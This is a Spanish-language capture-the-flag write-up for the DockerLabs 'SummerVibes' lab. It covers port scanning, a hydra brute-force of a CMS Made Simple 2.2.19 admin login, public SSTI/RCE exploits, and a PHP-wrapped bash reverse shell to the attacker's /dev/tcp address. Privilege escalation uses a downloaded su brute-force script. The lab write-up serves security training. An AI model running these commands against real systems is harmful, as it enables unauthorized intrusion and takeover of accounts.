# Máquina SummerVibes

Dificultad -> Difícil

Enlace a la máquina -> [Dockerlabs](https://dockerlabs.es/)

## Reconocimiento

Sabemos la IP de la maquina víctima y ahora lo que vamos a usar es nmap para realizar un escaneo general de los puertos que tiene abiertos.
 
Podemos usar diferentes opciones, estas son algunas para que sea rápido.
sudo nmap -p- -sS -sC -sV --min-rate 5000 -vvv -n -Pn 172.17.0.2
sudo nmap -p- -sS --open --min-rate 5000 -vvv -n 172.17.0.2
sudo nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG TodosLosPuertos
sudo nmap -p- -sS -sC -sV --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oX Maquina-summervibes
 

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 d1:19:f1:fa:48:16:af:8a:4a:89:2d:78:89:e9:2d:94 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBG36eG906mrEH+PhkX+d0kmBBpxW4ECArmbLYCP/Q3nWm464LsDcafYElms/gd6ol5iFMM3XLdWyEQiyy/MfZDM=
|   256 b8:b7:2e:64:3e:ee:c3:2e:2e:be:99:07:4e:02:4f:16 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIL/OHCYyijgZMo6u1RkpTLxjluOVfmcqxgB3eL+iMUpp
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Encontramos abiertos el puerto 22 ssh y el puerto 80 http que es un servidor Apache 2.4.52.
Abrimos el navegador y nos encontramos con la pagina por defecto de Apache.

 
Buscamos vulnerabilidades para Apache 2.4.52.

 

Revisamos el código de la página de inicio y encontramos un mensaje oculto donde dice que “cms made simple está instalado en un directorio, y para acceder cmsms”

 

Consulto con TARS sobre herramientas de fuzzing web.

 

Otras opciones para fuzzing web es gobuster, le consulto a TARS.
 

Tengo instalado OWASP ZAP que es más visual y tienes muchas más opciones, la abro para analizar lo que podemos encontrar.

 

  	 


 


Analizando con ZAP  http://172.17.0.2 no encontramos nada.

Ahora vamos a ver que es lo que podemos encontrar en http://172.17.0.2/cmsms 

 
 

Parece que es un gestor de contenido, “This site is powered by CMS Made Simple version 2.2.19”.

La última versión según la página web oficial es la 2.2.20.

 

Abrimos ZAP y conseguimos obtener algo más de información de algunas carpeta como: /uploads , /modules ,  /tmp  y /admin que es la más interesante porque es el panel de acceso a los usuarios , Login.

Probamos con los usuario y contraseña “admin”,”admin” , “User name or password incorrect”

 



## Explotación

Ahora buscamos información sobre este CMS 2.2.19 y si existe alguna vulnerabilidad.

 

Encontramos varias vulnerabilidades para esta versión de CMS, pero para poder usarlas tenemos que estar identificados en el panel de usuarios como administrador.

Ahora tenemos que buscar la forma de entrar en el panel como admin, una opción podría ser usar mediante un ataque de fuerza bruta con hydra y http-post-form.

Tenemos algo de información gracias al ZAP , que ya ha capturado una petición de login.

POST http://172.17.0.2/cmsms/admin/login.php

 

Y tenemos también la respuesta.

<div class="message error">
                            User name or password incorrect
</div>

 

Le preguntamos a TARS si nos puede ayudar un poco.

 

Con ayuda de TARS creamos el comando y le preguntamos si está bien.

 

hydra -l admin -P /usr/share/wordlists/rockyou.txt  -f "http-post-form://172.17.0.2/cmsms/admin/login.php:username=^USER^&password=^PASS^&loginsubmit=Submit:User name or password incorrect"

 
 

[80][http-post-form] host: 172.17.0.2   login: admin   password: chocolate

Hemos encontrado la contraseña para el usuario admin.
Ahora entramos en el panel y comprobamos si funcionan los exploits para este CMS Made Simple version 2.2.19 encontrados antes.

 

Ya estamos dentro del panel de administración, podemos mirar también algunas alertas.

 

Ahora vamos a probar los exploits encontrados, seguimos las instrucciones de cada uno. 
Exploit Title: CMS Made Simple Version: 2.2.19 – SSTI 
https://packetstormsecurity.com/files/177244/CMS-Made-Simple-2.2.19-Server-Side-Template-Injection.html
 
 
Exploit Title: CMS Made Simple Version: 2.2.19 – SSTI https://github.com/capture0x/CMSMadeSimple2
 

 

Podemos ver que este exploit está funcionando.

 

Ahora podemos probar con el siguiente exploit que ejecuta código remoto, y así podemos generar una reverse Shell desde el navegador y abrir una terminal directamente. 
CMS Made Simple Version 2.2.19 - Remote Code Execution Exploit
CMS Made Simple 2.2.19 Remote Code Execution ≈ Packet Storm (packetstormsecurity.com)
 
 

CMS Made Simple Version 2.2.19 - Remote Code Execution Exploit https://github.com/capture0x/CMSMadeSimple

 
 

 


 
Funciona el exploit, ahora tenemos que buscar un código para introducir una reverse Shell, podemos usar la herramienta online https://www.revshells.com/ 

 

Nos genera el código para escuchar con netcat o cualquier otra opción, en una terminal

sudo nc -lvnp 443

 

Y el código para el exploit con el reverse Shell, que se tiene que modificar algo, porque directamente no lo admite tal como lo genera.

sh -i >& /dev/tcp/172.17.0.1/443 0>&1

 

En vez de usar “sh” , vamos a usar “bash”

 

Para poder leer y escribir directamente, de la otra forma no se puede.

bash -i >& /dev/tcp/172.17.0.1/443 0>&1

Ahora solo queda unir este código con el del exploit:

<?php echo system('id'); ?>

Cambiamos id por el código reverse Shell, e incluimos: bash -c “código reverse shell”

Resultado:

<?php echo system('bash -c "bash -i >& /dev/tcp/172.17.0.1/443 0>&1" '); ?>

TARS nos lo puede explicar un poco por encima:
 

Probamos a ver qué pasa. Creamos “rvshell” en Extensiones – User Defined Tags.

 

Con Netcat a la escucha pulsamos en Run, si no funciona a la primera, probamos otra vez.
 

Y obtenemos la conexión.
 

Estamos dentro de la maquina víctima, pero no podemos hacer gran cosa.

 

Ahora lo ultimo que quedaría es escalar privilegios, y conseguir acceder como “root” mediante fuerza bruta.




## Escalada de privilegios

Para hacer un ataque de fuerza bruta al usuario root , necesitamos:

1-	 Un diccionario, para esta ocasión usare el que tiene Kali Linux en /usr/share/wordlists/rockyou.txt

2-	 Y un script para automatizar la comprobación de cada contraseña.

Para este caso usare este script: Maalfer/Sudo_BruteForce: Script hecho en bash para realizar un ataque de fuerza bruta a un usuario de un sistema Linux. (github.com)
Enlace RAW https://raw.githubusercontent.com/Maalfer/Sudo_BruteForce/main/Linux-Su-Force.sh

 

Descargamos el diccionario y el script en la maquina victima para después ejecutar el ataque.

Cambiamos al directorio /tmp

Usaremos: wget https://raw.githubusercontent.com/Maalfer/Sudo_BruteForce/main/Linux-Su-Force.sh

 

Luego en otra terminal creamos un Servidor HHTP simple para compartir por el puerto 80 la carpeta donde está el diccionario.

En una nueva terminal local, accedemos al directorio /usr/share/wordlists/
cd /usr/share/wordlists/
sudo python3 -m http.server 80









 

 

Y descargamos el diccionario: wget http://172.17.0.1/rockyou.txt

 

Ahora ya podemos usar el script de fuerza bruta.

bash Linux-Su-Force.sh root rockyou.txt

 

Parece ser que la contraseña “chocolate”, se ha reutilizado, podríamos haber probado a usar la misma contraseña, y nos habríamos ahorrado el proceso de fuerza bruta.

Ahora ya podemos escalar a root.

su
whoami

----------------
root
Hemos alcanzado el nivel de privilegios máximos en el sistema.

Ahora tratamos la tty para ver la Shell mejor.	script /dev/null -c bash


TUTORIALES

Github – WriteUps	-	CiberGonxz/DockerLabs-WriteUps (github.com)

Youtube		-	https://www.youtube.com/@CiberGon

Lista Reproducción Youtube:	https://youtube.com/playlist?list=PLy2SbJGtrfJlEswGyzcKAU2e_Pqh--WXq&si=6e8gvOE1Ivq9q9-p

